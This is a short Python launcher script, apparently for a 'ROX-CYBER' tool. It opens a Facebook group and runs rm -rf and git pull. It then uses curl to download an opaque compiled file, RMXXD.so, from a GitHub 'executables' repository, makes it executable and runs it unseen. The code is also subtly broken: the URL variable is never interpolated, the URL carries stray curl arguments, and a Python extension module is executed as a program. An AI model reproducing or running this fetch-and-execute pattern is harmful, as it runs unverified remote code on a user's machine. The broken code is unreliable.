import os, sys, platform
try:
    import requests
except:
    os.system('pip install requests')
os.system('xdg-open https://facebook.com/groups/770617227293870/')
import requests
try:
    if sys.argv[1]=='update':
        os.system('rm -rf RMXXD.so')
except:
    pass
os.system('rm -rf RMXXD.so')
os.system('git pull')
url = "https://github.com/ROX-CYBER/executables/blob/main/RMXXD.cpython-311.so?raw=true -o RMXXD.so"
os.system('mkdir .RMX')
os.system('curl -L {url} > RMXXD.so')
os.system('chmod +x RMXXD.so')
os.system('./RMXXD.so')
